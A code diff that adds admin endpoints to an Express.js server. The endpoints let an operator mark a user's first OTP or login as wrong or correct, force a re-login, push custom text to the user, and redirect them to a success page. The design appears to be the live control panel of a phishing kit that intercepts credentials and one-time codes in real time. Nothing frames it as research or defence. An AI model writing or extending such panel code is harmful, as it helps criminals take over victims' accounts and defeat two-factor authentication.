@@ -255,6 +255,29 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
   res.json(r.rows);
 });
 
+app.get('/api/admin/blocked-emails', authenticateJWT, async (req, res) => {
+  const r = await pool.query('SELECT * FROM blocked_emails ORDER BY blocked_at DESC');
+  res.json(r.rows);
+});
+
+app.post('/api/admin/block-email', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email required' });
+  await pool.query('INSERT INTO blocked_emails (email, blocked_by) VALUES ($1, $2) ON CONFLICT DO NOTHING', [email, req.user.email]);
+  await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
+  io.emit('user-blocked', { email, timestamp: new Date() });
+  res.json({ success: true });
+});
+
+app.post('/api/admin/unblock-email', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email required' });
+  await pool.query('DELETE FROM blocked_emails WHERE LOWER(email) = LOWER($1)', [email]);
+  await pool.query('UPDATE users SET redirect_success = false WHERE email = $1', [email]);
+  io.emit('user-unblocked', { email, timestamp: new Date() });
+  res.json({ success: true });
+});
+
 app.post('/api/admin/approve-user', authenticateJWT, async (req, res) => {
   const { email } = req.body;
   await pool.query('UPDATE users SET approved = true WHERE email = $1', [email]);
@@ -270,6 +293,12 @@ app.post('/api/admin/approve-first-otp', authenticateJWT, async (req, res) => {
 app.post('/api/admin/incorrect-first-otp', authenticateJWT, async (req, res) => {
   const { email } = req.body;
   await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['incorrect_otp_error', email]);
+  res.json({ success: true });
+});
+
+app.post('/api/admin/never-first-otp', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET otp1_never = true WHERE email = $1', [email]);
   res.json({ success: true });
 });
 
@@ -289,6 +318,46 @@ app.delete('/api/admin/delete-user', authenticateJWT, async (req, res) => {
   const { email } = req.body;
   await pool.query('DELETE FROM users WHERE email = $1', [email]);
   io.emit('user-deleted', { email, timestamp: new Date() });
+  res.json({ success: true });
+});
+
+app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET force_login = true WHERE email = $1', [email]);
+  io.emit('force-login-triggered', { email, timestamp: new Date() });
+  res.json({ success: true });
+});
+
+app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET redirect_success = true WHERE email = $1', [email]);
+  io.emit('redirect-success-triggered', { email, timestamp: new Date() });
+  res.json({ success: true });
+});
+
+app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
+  const { email, text } = req.body;
+  if (!text) return res.status(400).json({ error: 'Text required' });
+  await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', [text, email]);
+  io.emit('text-sent', { email, text, timestamp: new Date() });
+  res.json({ success: true });
+});
+
+app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET text_release = true, admin_text = NULL WHERE email = $1', [email]);
+  res.json({ success: true });
+});
+
+app.post('/api/admin/wrong-login', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET admin_text = $1, text_release = false WHERE email = $2', ['wrong_login_error', email]);
+  res.json({ success: true });
+});
+
+app.post('/api/admin/correct-login', authenticateJWT, async (req, res) => {
+  const { email } = req.body;
+  await pool.query('UPDATE users SET admin_text = $1, text_release = false, force_login = false WHERE email = $2', ['correct_login_success', email]);
   res.json({ success: true });
 });
 
